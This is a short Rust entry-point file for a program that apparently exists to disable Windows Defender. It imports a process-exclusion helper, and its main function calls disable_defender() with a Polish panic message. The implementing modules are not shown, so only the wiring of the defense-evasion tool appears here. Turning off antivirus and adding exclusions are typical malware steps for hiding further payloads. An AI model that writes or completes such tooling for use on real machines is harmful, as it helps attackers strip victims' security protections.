use defender::add_exclusion_process;
use unwrap::CustomUnwrap;

use crate::defender::disable_defender;

mod defender;
mod globals;
mod unwrap;

fn main() {
    disable_defender().expect("No cuż");
}